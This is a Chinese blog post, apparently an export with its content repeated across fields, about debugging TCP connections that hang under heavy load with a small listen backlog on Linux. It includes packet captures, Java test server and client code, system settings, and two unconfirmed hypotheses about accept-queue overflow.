我抽查的十几个hang住的端口对应的报文都是三次握手成功，然后还hang住时是没有新的报文的，client一关闭，发送了FIN后，一种情况是，server端就发送数据给client，另一种情况是server端对client的FIN报文返回RST。 报文如下 第一种情况的报文，这种是client hang住没多久就关掉整个client进程时出现的情况 12345678 117890 271.658989117 127.0.0.1 127.0.0.1 TCP 74 [TCP Port numbers reused] 40900 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647083 TSecr=0 WS=128 201498 272.673187012 127.0.0.1 127.0.0.1 TCP 74 [TCP Retransmission] 40900 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648097 TSecr=0 WS=128 201591 272.673232077 127.0.0.1 127.0.0.1 TCP 74 8083 → 40900 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648068 TSecr=298648097 WS=128 201643 272.673288084 127.0.0.1 127.0.0.1 TCP 66 40900 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298648097 TSecr=298648068 203783 297.152188039 127.0.0.1 127.0.0.1 TCP 66 40900 → 8083 [FIN, ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298672576 TSecr=298648068 203823 297.152451323 127.0.0.1 127.0.0.1 TCP 73 8083 → 40900 [PSH, ACK] Seq=1 Ack=2 Win=29312 Len=7 TSval=298672576 TSecr=2986725760000 68 65 6c 6c 6f 0d 0a hello.. 203825 297.152464118 127.0.0.1 127.0.0.1 TCP 54 40900 → 8083 [RST] Seq=2 Win=0 Len=0 第二种情况的报文，这种是client hang住很久才关掉整个client进程时出现的情况 123456 21004 108.400081512 127.0.0.1 127.0.0.1 TCP 74 46538 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298483826 TSecr=0 WS=128 92060 109.409186851 127.0.0.1 127.0.0.1 TCP 74 [TCP Retransmission] 46538 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298484836 TSecr=0 WS=128 92108 109.409228584 127.0.0.1 127.0.0.1 TCP 74 8083 → 46538 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298484804 TSecr=298484836 WS=128 92155 109.409268850 127.0.0.1 127.0.0.1 TCP 66 46538 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298484836 TSecr=298484804112908 254.340209126 127.0.0.1 127.0.0.1 TCP 66 46538 → 8083 [FIN, ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298629764 TSecr=298484804112909 254.340214301 127.0.0.1 127.0.0.1 TCP 54 8083 → 46538 [RST] Seq=1 Win=0 Len=0 复现 server 1234567891011121314151617181920212223242526import java.io.IOException;import java.net.ServerSocket;import java.net.Socket;import java.util.concurrent.Executor;import java.util.concurrent.Executors;public class TestBacklogServer &#123; public static void main(String[] args) throws IOException &#123; Executor executor = Executors.newFixedThreadPool(128); ServerSocket socket = new ServerSocket(8083, 10); int cnt = 0; while (true) &#123; final Socket client = socket.accept(); System.out.println(cnt + \": accept one: \" + client.getRemoteSocketAddress()); cnt++; executor.execute(() -&gt; &#123; try &#123; client.getOutputStream().write(\"hello\\r\\n\".getBytes()); client.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;); &#125; &#125;&#125; client。之所以设置了timeout，是为了拿到hang住的端口号，测试时可以不设置timeout，然后在没有新的输出时，threadDump，可以看到有多个链接hang在read那里 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import java.io.BufferedReader;import java.io.FileReader;import java.io.IOException;import java.io.InputStream;import java.net.ServerSocket;import java.net.Socket;import java.net.SocketTimeoutException;import java.util.HashSet;import java.util.Vector;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;import java.util.concurrent.TimeUnit;import java.util.concurrent.atomic.LongAdder;import java.util.regex.Matcher;import java.util.regex.Pattern;public class TestBacklogClient &#123; private static final LongAdder adder = new LongAdder(); public static void main(String[] args) throws IOException, InterruptedException &#123; Vector&lt;Integer&gt; timeoutPorts = new Vector&lt;&gt;(1240); ExecutorService pool = Executors.newFixedThreadPool(128); for (int i = 0; i &lt; 10240; i++) &#123; int finalI = i; pool.execute(() -&gt; &#123; try &#123; Socket socket = new Socket(\"localhost\", 8083); socket.setSoTimeout(1024 * 10); System.out.println(\"connect Success one: \" + finalI); String r = readLine(socket.getInputStream()); assert r == null || \"hello\\r\\n\".equals(r); if (r == null) &#123; timeoutPorts.add(socket.getLocalPort()); &#125; System.out.println(\"read success one: \" + finalI); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;); &#125; pool.shutdown(); pool.awaitTermination(1024, TimeUnit.DAYS); System.out.println(adder.sum()); System.out.println(timeoutPorts); &#125; private static String readLine(InputStream in) throws IOException &#123; byte[] buf = new byte[1024]; StringBuilder builder = new StringBuilder(); try &#123; while (true) &#123; int t = in.read(buf); if (t &lt; 0) &#123; break; &#125; builder.append(new String(buf, 0, t)); &#125; return builder.toString(); &#125; catch (SocketTimeoutException ex) &#123; adder.add(1); System.out.println(\"time out, read: \" + builder.length() + \", \" + builder.toString() + \", hasCRLF: \" + (builder.lastIndexOf(\"\\r\\n\") &gt;= 0)); &#125; return null; &#125;&#125; localhost的系统配置信息 1234567891011121314151617181920$ uname -r4.18.0-13-generic$ /bin/cat /proc/sys/net/ipv4/tcp_max_syn_backlog512$ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 18.10Release: 18.10Codename: cosmic$ java -version openjdk version &quot;11.0.1&quot; 2018-10-16OpenJDK Runtime Environment 18.9 (build 11.0.1+13)OpenJDK 64-Bit Server VM 18.9 (build 11.0.1+13, mixed mode)$ /bin/cat /proc/sys/net/core/somaxconn 128 vps的配置信息 1234567891011121314151617181920root@vultr:~# ./jdk-11.0.2/bin/java -versionjava version &quot;11.0.2&quot; 2019-01-15 LTSJava(TM) SE Runtime Environment 18.9 (build 11.0.2+9-LTS)Java HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.2+9-LTS, mixed mode)root@vultr:~# uname -r4.18.0-10-genericroot@vultr:~# lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 18.10Release: 18.10Codename: cosmicroot@vultr:~# /bin/cat /proc/sys/net/ipv4/tcp_max_syn_backlog128root@vultr:~# /bin/cat /proc/sys/net/core/somaxconn128 复现过程出现过这个现象：client端ctrl-c关掉后，server端突然就接收到了剩下的所有链接。这个在server运行在localhost时并且 一旦所有其他没有被hang住的链接完成后马上就ctrl-c时出现过，但是在server运行在vps上没出现过。 猜测原因一 按照TCP/IP详解卷二的说法，如果listen的那个端点的队列满了（已经完成三次握手的队列，其大小由backlog确定），那么就不回复syn。但是，有个问题，如果多个syn同时到达，那么即使这时候队列未满，也可能接受了这些syn的一部分后队列就满了，那么linux系统如何处理——是否会存在有些链接三次握手完成，但是放不进队列里。 按照这篇文章(http://veithen.io/2014/01/01/how-tcp-backlog-works-in-linux.html)的说法，如果遇到这种情况，服务器会不断发送syn/ack报文（如果/proc/sys/net/ipv4/tcp_abort_on_overflow是1，则发送RST） 我自己也抓到了这种报文，其中8083是server，server的backlog只有10，然后有10240个client企图链接该server。 123456789101112131415No. Time Source Destination Protocol Length Info 117974 271.659812650 127.0.0.1 127.0.0.1 TCP 74 [TCP Port numbers reused] 40970 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647084 TSecr=0 WS=128 117976 271.659818367 127.0.0.1 127.0.0.1 TCP 74 8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647084 TSecr=298647084 WS=128 117977 271.659825016 127.0.0.1 127.0.0.1 TCP 66 40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298647084 TSecr=298647084 201482 272.673178662 127.0.0.1 127.0.0.1 TCP 74 [TCP Retransmission] 8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648097 TSecr=298647084 WS=128 201563 272.673220860 127.0.0.1 127.0.0.1 TCP 66 [TCP Dup ACK 117977#1] 40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298648097 TSecr=298647084 201993 274.693205982 127.0.0.1 127.0.0.1 TCP 74 [TCP Retransmission] 8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298650117 TSecr=298648097 WS=128 201995 274.693247830 127.0.0.1 127.0.0.1 TCP 66 [TCP Dup ACK 117977#2] 40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298650117 TSecr=298647084 201997 274.693527487 127.0.0.1 127.0.0.1 TCP 73 8083 → 40970 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=298650117 TSecr=2986501170000 68 65 6c 6c 6f 0d 0a hello.. 201999 274.693556287 127.0.0.1 127.0.0.1 TCP 66 40970 → 8083 [ACK] Seq=1 Ack=8 Win=43776 Len=0 TSval=298650117 TSecr=298650117 202001 274.695599421 127.0.0.1 127.0.0.1 TCP 66 8083 → 40970 [FIN, ACK] Seq=8 Ack=1 Win=43776 Len=0 TSval=298650119 TSecr=298650117 202009 274.737168658 127.0.0.1 127.0.0.1 TCP 66 40970 → 8083 [ACK] Seq=1 Ack=9 Win=43776 Len=0 TSval=298650161 TSecr=298650119 203731 297.151676910 127.0.0.1 127.0.0.1 TCP 66 40970 → 8083 [FIN, ACK] Seq=1 Ack=9 Win=43776 Len=0 TSval=298672575 TSecr=298650119 203732 297.151682855 127.0.0.1 127.0.0.1 TCP 66 8083 → 40970 [ACK] Seq=9 Ack=2 Win=43776 Len=0 TSval=298672575 TSecr=298672575 在/proc/sys/net/ipv4/tcp_abort_on_overflow设为1之后，抓到了如下报文。需要注意，那个RST并不是服务器关闭了，服务器后面还对其他链接响应了很多报文 1234567No. Time Source Destination Protocol Length Info 5904 9.174057671 127.0.0.1 127.0.0.1 TCP 74 54448 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300065429 TSecr=0 WS=128 92075 10.190560916 127.0.0.1 127.0.0.1 TCP 74 [TCP Retransmission] 54448 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300066446 TSecr=0 WS=128 92209 12.206628025 127.0.0.1 127.0.0.1 TCP 74 [TCP Retransmission] 54448 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300068462 TSecr=0 WS=128 92258 12.206814283 127.0.0.1 127.0.0.1 TCP 74 8083 → 54448 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300068462 TSecr=300068462 WS=128 92319 12.207072233 127.0.0.1 127.0.0.1 TCP 66 54448 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=300068462 TSecr=300068462 92345 12.207466000 127.0.0.1 127.0.0.1 TCP 54 8083 → 54448 [RST] Seq=1 Win=0 Len=0 需要注意，那个RST并不是服务器关闭了，服务器后面还对其他链接响应了很多报文——如下面所示，最后的那个No.为92345后面还有很多报文，都是8083端口的server与client的通信 123456No. Time Source Destination Protocol Length Info 92345 12.207466000 127.0.0.1 127.0.0.1 TCP 54 8083 → 54448 [RST] Seq=1 Win=0 Len=0 92346 12.207985091 127.0.0.1 127.0.0.1 TCP 73 8083 → 54168 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=300068463 TSecr=300068462 92347 12.208004676 127.0.0.1 127.0.0.1 TCP 66 54168 → 8083 [ACK] Seq=1 Ack=8 Win=43776 Len=0 TSval=300068463 TSecr=300068463 92348 12.208041224 127.0.0.1 127.0.0.1 TCP 66 8083 → 54168 [FIN, ACK] Seq=8 Ack=1 Win=43776 Len=0 TSval=300068463 TSecr=300068463 92349 12.208052138 127.0.0.1 127.0.0.1 TCP 73 8083 → 54172 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=300068463 TSecr=300068462 然而，这个并不是上述问题的原因，因为打印出来的hang住的端口号，跟发生重传syn/ack的端口号对不上 猜测原因二 网上搜到这篇文章http://www.10tiao.com/html/749/201411/201005717/1.html 案例分析（二）那里描述的现象刚好跟跟上述问题非常相似——也是client握手成功但是读不到信息，作者分析的原因是，第三次握手的ACK因为AcceptQueue溢出而被丢弃，导致client进入了ESTABLISHED状态，但是server只是在SYN_RECV状态，并且因为net.ipv4.tcp_synack_retries=1(我的测试机器的这个参数是5)，所以如果Server重传的SYN+ACK报文对应的ACK还是被丢弃，那么就会进入client以为连接成功，但是server并没有连接成功的状态 然而，我把server架设到另一个机子上，然后使用watch -n 0.5 &quot;netcat -n | grep 8083 | grep -i &quot;syn&quot;&quot;检查server那里是否有链接是一直处于syn_recv状态，但是整个过程中看到的处于SYN_RECV状态的链接端口号都是在不断变动（说明它们不是hang住的链接），并且client端所有没有hang住的链接都完成后，只剩下hang住的链接时，server端是看不到处于syn_recv状态的链接的 所以我认为可能也不是这个原因（欢迎指正！） 结尾 这个问题并没有解决，如果有大佬知道原因，或者有一些想法，欢迎与我交流，谢谢！","raw":"---\ntitle: 高并发情况下backlog过低出现的问题\ndate: 2019-03-19 21:58:41\ntags:\n- 高并发\n- backlog\n- TCP\ncategories:\n- 网络编程\n---\n\n### 问题\n\n- 最近重构一个以前写的FTP Server，压测时，服务器的backlog是20，然后client总是有一些链接，已经`new Socket()`成功（根据测试，这意味着三次握手完成），但是就是收不到welcome信息，服务端的log看到的accept的链接数目少于client打开的链接数目(服务端的accept也没有报错)，少的数量刚好是client端hang住在读welcome信息那些链接的数目。后来尝试了调整`ulimit`无果，调整了backlog后就好了。看起来就像是一些链接被悄无声息（没有返回FIN或RST之类的报文）地从 等待被应用accept的队列 移除。\n- 我抽查的十几个hang住的端口对应的报文都是三次握手成功，然后还hang住时是没有新的报文的，client一关闭，发送了FIN后，一种情况是，server端就发送数据给client，另一种情况是server端对client的FIN报文返回RST。\n- 报文如下\n   - 第一种情况的报文，这种是client hang住没多久就关掉整个client进程时出现的情况\n\n   ```\n    117890 271.658989117  127.0.0.1             127.0.0.1             TCP      74     [TCP Port numbers reused] 40900 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647083 TSecr=0 WS=128\n    201498 272.673187012  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 40900 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648097 TSecr=0 WS=128\n    201591 272.673232077  127.0.0.1             127.0.0.1             TCP      74     8083 → 40900 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648068 TSecr=298648097 WS=128\n    201643 272.673288084  127.0.0.1             127.0.0.1             TCP      66     40900 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298648097 TSecr=298648068\n    203783 297.152188039  127.0.0.1             127.0.0.1             TCP      66     40900 → 8083 [FIN, ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298672576 TSecr=298648068\n    203823 297.152451323  127.0.0.1             127.0.0.1             TCP      73     8083 → 40900 [PSH, ACK] Seq=1 Ack=2 Win=29312 Len=7 TSval=298672576 TSecr=298672576\n   0000  68 65 6c 6c 6f 0d 0a                              hello..\n    203825 297.152464118  127.0.0.1             127.0.0.1             TCP      54     40900 → 8083 [RST] Seq=2 Win=0 Len=0\n   ```\n\n   - 第二种情况的报文，这种是client hang住很久才关掉整个client进程时出现的情况\n\n   ```\n     21004 108.400081512  127.0.0.1             127.0.0.1             TCP      74     46538 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298483826 TSecr=0 WS=128\n     92060 109.409186851  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 46538 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298484836 TSecr=0 WS=128\n     92108 109.409228584  127.0.0.1             127.0.0.1             TCP      74     8083 → 46538 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298484804 TSecr=298484836 WS=128\n     92155 109.409268850  127.0.0.1             127.0.0.1             TCP      66     46538 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298484836 TSecr=298484804\n    112908 254.340209126  127.0.0.1             127.0.0.1             TCP      66     46538 → 8083 [FIN, ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298629764 TSecr=298484804\n    112909 254.340214301  127.0.0.1             127.0.0.1             TCP      54     8083 → 46538 [RST] Seq=1 Win=0 Len=0\n   ```\n\n\n### 复现\n\n- server\n   ```java\n   import java.io.IOException;\n   import java.net.ServerSocket;\n   import java.net.Socket;\n   import java.util.concurrent.Executor;\n   import java.util.concurrent.Executors;\n   \n   public class TestBacklogServer {\n       public static void main(String[] args) throws IOException {\n           Executor executor = Executors.newFixedThreadPool(128);\n           ServerSocket socket = new ServerSocket(8083, 10);\n           int cnt = 0;\n           while (true) {\n               final Socket client = socket.accept();\n               System.out.println(cnt + \": accept one: \" + client.getRemoteSocketAddress());\n               cnt++;\n               executor.execute(() -> {\n                   try {\n                       client.getOutputStream().write(\"hello\\r\\n\".getBytes());\n                       client.close();\n                   } catch (IOException e) {\n                       e.printStackTrace();\n                   }\n               });\n           }\n       }\n   }\n   ```\n- client。之所以设置了timeout，是为了拿到hang住的端口号，测试时可以不设置timeout，然后在没有新的输出时，threadDump，可以看到有多个链接hang在read那里\n   ```java\n   import java.io.BufferedReader;\n   import java.io.FileReader;\n   import java.io.IOException;\n   import java.io.InputStream;\n   import java.net.ServerSocket;\n   import java.net.Socket;\n   import java.net.SocketTimeoutException;\n   import java.util.HashSet;\n   import java.util.Vector;\n   import java.util.concurrent.ExecutorService;\n   import java.util.concurrent.Executors;\n   import java.util.concurrent.TimeUnit;\n   import java.util.concurrent.atomic.LongAdder;\n   import java.util.regex.Matcher;\n   import java.util.regex.Pattern;\n   \n   public class TestBacklogClient {\n       private static final LongAdder adder = new LongAdder();\n   \n       public static void main(String[] args) throws IOException, InterruptedException {\n           Vector<Integer> timeoutPorts = new Vector<>(1240);\n           ExecutorService pool = Executors.newFixedThreadPool(128);\n           for (int i = 0; i < 10240; i++) {\n               int finalI = i;\n               pool.execute(() -> {\n                   try {\n                       Socket socket = new Socket(\"localhost\", 8083);\n                       socket.setSoTimeout(1024 * 10);\n                       System.out.println(\"connect Success one: \" + finalI);\n                       String r = readLine(socket.getInputStream());\n                       assert r == null || \"hello\\r\\n\".equals(r);\n                       if (r == null) {\n                           timeoutPorts.add(socket.getLocalPort());\n                       }\n                       System.out.println(\"read success one: \" + finalI);\n                   } catch (IOException e) {\n                       e.printStackTrace();\n                   }\n               });\n           }\n           pool.shutdown();\n           pool.awaitTermination(1024, TimeUnit.DAYS);\n           System.out.println(adder.sum());\n           System.out.println(timeoutPorts);\n       }\n   \n       private static String readLine(InputStream in) throws IOException {\n           byte[] buf = new byte[1024];\n           StringBuilder builder = new StringBuilder();\n           try {\n               while (true) {\n                   int t = in.read(buf);\n                   if (t < 0) {\n                       break;\n                   }\n                   builder.append(new String(buf, 0, t));\n               }\n               return builder.toString();\n           } catch (SocketTimeoutException ex) {\n               adder.add(1);\n               System.out.println(\"time out, read: \" + builder.length()\n                       + \", \" + builder.toString()\n                       + \", hasCRLF: \" + (builder.lastIndexOf(\"\\r\\n\") >= 0));\n           }\n           return null;\n       }\n   }\n   ```\n\n- localhost的系统配置信息\n   ```\n   $ uname -r\n   4.18.0-13-generic\n   \n   $ /bin/cat /proc/sys/net/ipv4/tcp_max_syn_backlog\n   512\n   \n   $ lsb_release -a\n   No LSB modules are available.\n   Distributor ID:\tUbuntu\n   Description:\tUbuntu 18.10\n   Release:\t18.10\n   Codename:\tcosmic\n\n   $ java -version                  \n   openjdk version \"11.0.1\" 2018-10-16\n   OpenJDK Runtime Environment 18.9 (build 11.0.1+13)\n   OpenJDK 64-Bit Server VM 18.9 (build 11.0.1+13, mixed mode)\n\n   $ /bin/cat /proc/sys/net/core/somaxconn    \n   128\n   ```\n- vps的配置信息\n   ```\n   root@vultr:~# ./jdk-11.0.2/bin/java -version\n   java version \"11.0.2\" 2019-01-15 LTS\n   Java(TM) SE Runtime Environment 18.9 (build 11.0.2+9-LTS)\n   Java HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.2+9-LTS, mixed mode)\n   \n   root@vultr:~# uname -r\n   4.18.0-10-generic\n   \n   root@vultr:~# lsb_release -a\n   No LSB modules are available.\n   Distributor ID: Ubuntu\n   Description:    Ubuntu 18.10\n   Release:        18.10\n   Codename:       cosmic\n   \n   root@vultr:~# /bin/cat /proc/sys/net/ipv4/tcp_max_syn_backlog\n   128\n   \n   root@vultr:~# /bin/cat /proc/sys/net/core/somaxconn\n   128\n   ```\n- 复现过程出现过这个现象：client端`ctrl-c`关掉后，server端突然就接收到了剩下的所有链接。这个在server运行在localhost时并且 一旦所有其他没有被hang住的链接完成后马上就`ctrl-c`时出现过，但是在server运行在vps上没出现过。\n\n\n### 猜测原因一\n\n- 按照TCP/IP详解卷二的说法，如果listen的那个端点的队列满了（已经完成三次握手的队列，其大小由backlog确定），那么就不回复syn。但是，有个问题，如果多个syn同时到达，那么即使这时候队列未满，也可能接受了这些syn的一部分后队列就满了，那么linux系统如何处理——是否会存在有些链接三次握手完成，但是放不进队列里。\n\n- 按照这篇文章([http://veithen.io/2014/01/01/how-tcp-backlog-works-in-linux.html](http://veithen.io/2014/01/01/how-tcp-backlog-works-in-linux.html))的说法，如果遇到这种情况，服务器会不断发送`syn/ack`报文（如果`/proc/sys/net/ipv4/tcp_abort_on_overflow`是`1`，则发送RST）\n\n- 我自己也抓到了这种报文，其中8083是server，server的backlog只有10，然后有10240个client企图链接该server。\n   ```\n   No.     Time           Source                Destination           Protocol Length Info\n    117974 271.659812650  127.0.0.1             127.0.0.1             TCP      74     [TCP Port numbers reused] 40970 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647084 TSecr=0 WS=128\n    117976 271.659818367  127.0.0.1             127.0.0.1             TCP      74     8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647084 TSecr=298647084 WS=128\n    117977 271.659825016  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298647084 TSecr=298647084\n    201482 272.673178662  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648097 TSecr=298647084 WS=128\n    201563 272.673220860  127.0.0.1             127.0.0.1             TCP      66     [TCP Dup ACK 117977#1] 40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298648097 TSecr=298647084\n    201993 274.693205982  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298650117 TSecr=298648097 WS=128\n    201995 274.693247830  127.0.0.1             127.0.0.1             TCP      66     [TCP Dup ACK 117977#2] 40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298650117 TSecr=298647084\n    201997 274.693527487  127.0.0.1             127.0.0.1             TCP      73     8083 → 40970 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=298650117 TSecr=298650117\n   0000  68 65 6c 6c 6f 0d 0a                              hello..\n    201999 274.693556287  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [ACK] Seq=1 Ack=8 Win=43776 Len=0 TSval=298650117 TSecr=298650117\n    202001 274.695599421  127.0.0.1             127.0.0.1             TCP      66     8083 → 40970 [FIN, ACK] Seq=8 Ack=1 Win=43776 Len=0 TSval=298650119 TSecr=298650117\n    202009 274.737168658  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [ACK] Seq=1 Ack=9 Win=43776 Len=0 TSval=298650161 TSecr=298650119\n    203731 297.151676910  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [FIN, ACK] Seq=1 Ack=9 Win=43776 Len=0 TSval=298672575 TSecr=298650119\n    203732 297.151682855  127.0.0.1             127.0.0.1             TCP      66     8083 → 40970 [ACK] Seq=9 Ack=2 Win=43776 Len=0 TSval=298672575 TSecr=298672575\n   ```\n   在`/proc/sys/net/ipv4/tcp_abort_on_overflow`设为`1`之后，抓到了如下报文。需要注意，那个RST并不是服务器关闭了，服务器后面还对其他链接响应了很多报文\n   ```\n   No.     Time           Source                Destination           Protocol Length Info\n      5904 9.174057671    127.0.0.1             127.0.0.1             TCP      74     54448 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300065429 TSecr=0 WS=128\n     92075 10.190560916   127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 54448 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300066446 TSecr=0 WS=128\n     92209 12.206628025   127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 54448 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300068462 TSecr=0 WS=128\n     92258 12.206814283   127.0.0.1             127.0.0.1             TCP      74     8083 → 54448 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300068462 TSecr=300068462 WS=128\n     92319 12.207072233   127.0.0.1             127.0.0.1             TCP      66     54448 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=300068462 TSecr=300068462\n     92345 12.207466000   127.0.0.1             127.0.0.1             TCP      54     8083 → 54448 [RST] Seq=1 Win=0 Len=0\n   ```\n   需要注意，那个RST并不是服务器关闭了，服务器后面还对其他链接响应了很多报文——如下面所示，最后的那个No.为`92345`后面还有很多报文，都是8083端口的server与client的通信\n   ```\n   No.     Time           Source                Destination           Protocol Length Info\n     92345 12.207466000   127.0.0.1             127.0.0.1             TCP      54     8083 → 54448 [RST] Seq=1 Win=0 Len=0\n     92346 12.207985091   127.0.0.1             127.0.0.1             TCP      73     8083 → 54168 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=300068463 TSecr=300068462\n     92347 12.208004676   127.0.0.1             127.0.0.1             TCP      66     54168 → 8083 [ACK] Seq=1 Ack=8 Win=43776 Len=0 TSval=300068463 TSecr=300068463\n     92348 12.208041224   127.0.0.1             127.0.0.1             TCP      66     8083 → 54168 [FIN, ACK] Seq=8 Ack=1 Win=43776 Len=0 TSval=300068463 TSecr=300068463\n     92349 12.208052138   127.0.0.1             127.0.0.1             TCP      73     8083 → 54172 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=300068463 TSecr=300068462\n   ```\n- 然而，这个并不是上述问题的原因，因为打印出来的hang住的端口号，跟发生重传`syn/ack`的端口号对不上\n\n### 猜测原因二\n\n- 网上搜到这篇文章[http://www.10tiao.com/html/749/201411/201005717/1.html](http://www.10tiao.com/html/749/201411/201005717/1.html)\n- 案例分析（二）那里描述的现象刚好跟跟上述问题非常相似——也是client握手成功但是读不到信息，作者分析的原因是，第三次握手的ACK因为AcceptQueue溢出而被丢弃，导致client进入了ESTABLISHED状态，但是server只是在`SYN_RECV`状态，并且因为`net.ipv4.tcp_synack_retries=1`(我的测试机器的这个参数是5)，所以如果Server重传的SYN+ACK报文对应的ACK还是被丢弃，那么就会进入client以为连接成功，但是server并没有连接成功的状态\n- 然而，我把server架设到另一个机子上，然后使用`watch -n 0.5 \"netcat -n | grep 8083 | grep -i \"syn\"\"`检查server那里是否有链接是一直处于`syn_recv`状态，但是整个过程中看到的处于`SYN_RECV`状态的链接端口号都是在不断变动（说明它们不是hang住的链接），并且client端所有没有hang住的链接都完成后，只剩下hang住的链接时，server端是看不到处于`syn_recv`状态的链接的\n- 所以我认为可能也不是这个原因（欢迎指正！）\n\n### 结尾\n\n- 这个问题并没有解决，如果有大佬知道原因，或者有一些想法，欢迎与我交流，谢谢！\n","content":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><ul>\n<li>最近重构一个以前写的FTP Server，压测时，服务器的backlog是20，然后client总是有一些链接，已经<code>new Socket()</code>成功（根据测试，这意味着三次握手完成），但是就是收不到welcome信息，服务端的log看到的accept的链接数目少于client打开的链接数目(服务端的accept也没有报错)，少的数量刚好是client端hang住在读welcome信息那些链接的数目。后来尝试了调整<code>ulimit</code>无果，调整了backlog后就好了。看起来就像是一些链接被悄无声息（没有返回FIN或RST之类的报文）地从 等待被应用accept的队列 移除。</li>\n<li>我抽查的十几个hang住的端口对应的报文都是三次握手成功，然后还hang住时是没有新的报文的，client一关闭，发送了FIN后，一种情况是，server端就发送数据给client，另一种情况是server端对client的FIN报文返回RST。</li>\n<li><p>报文如下</p>\n<ul>\n<li><p>第一种情况的报文，这种是client hang住没多久就关掉整个client进程时出现的情况</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 